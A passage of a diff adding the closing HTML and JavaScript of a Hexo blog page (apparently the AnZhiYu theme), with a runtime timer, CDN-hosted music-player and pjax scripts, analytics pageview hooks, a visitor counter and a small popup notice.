+
+    if (document.getElementById("runtimeTextTip")) {
+      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
+    }
+  }
+
+  setInterval(() => {
+    updateTime();
+    updateHtml();
+  }, 1000);
+})();</script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.cbd.int/qrcodejs@1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
